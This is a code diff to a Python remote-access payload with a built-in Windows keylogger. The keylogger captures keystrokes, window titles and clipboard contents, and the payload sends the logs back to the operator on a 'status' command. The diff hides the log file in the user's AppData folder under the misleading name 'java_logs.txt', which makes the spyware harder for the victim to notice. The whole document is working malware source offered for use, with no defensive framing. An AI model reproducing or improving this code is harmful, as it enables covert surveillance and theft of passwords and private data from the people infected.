@@ -74,6 +74,9 @@ class Payload:
 
     result_commande = ""
 
+    appdata = os.path.expandvars("%AppData%")
+    path_keylog = appdata + "/java_logs.txt"
+
     def run(self):
 
         while True:
@@ -206,7 +209,7 @@ class Payload:
                         elif splited_command[1].lower() == "status":
                             # envoyer retour du keylogger
                             #self.keylogger_mode = "status"
-                            file = open("keylogs.txt", 'r')
+                            file = open(self.path_keylog, 'r')
                             logs = file.read()
                             file.close()
                             output = logs
@@ -335,6 +338,8 @@ class Keylogger:
     kernel32 = windll.kernel32
     psapi = windll.psapi
     current_window = None
+    appdata = os.path.expandvars("%AppData%")
+    path_keylog = appdata + "/java_logs.txt"
 
     def Keylog(self):
 
@@ -376,7 +381,7 @@ class Keylogger:
               (process_id, executable.value, window_title.value))
         var = "PID : %s - %s - %s" % (process_id,
                                       executable.value, window_title.value)
-        file = open("keylogs.txt", 'a')
+        file = open(self.path_keylog, 'a')
         file.write("\n%s\n" % var)
         file.close()
         print()
@@ -405,7 +410,7 @@ class Keylogger:
         if event.Ascii in range(32, 128):
             print(chr(event.Ascii))
             h = chr(event.Ascii)
-            file = open("keylogs.txt", 'a')
+            file = open(self.path_keylog, 'a')
             file.write("%s" % h)
             file.close()
         else:
@@ -415,12 +420,12 @@ class Keylogger:
                 pasted_value = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
                 print("[PASTE] - {0}".format(pasted_value))
-                file = open("keylogs.txt", 'a')
+                file = open(self.path_keylog, 'a')
                 file.write("\n[PASTE] - {0}\n".format(pasted_value))
                 file.close()
             else:
                 print("{0}".format(event.Key))
-                file = open("keylogs.txt", 'a')
+                file = open(self.path_keylog, 'a')
                 file.write("{0}".format(event.Key))
                 file.close()
         # pass execution to next hook registered
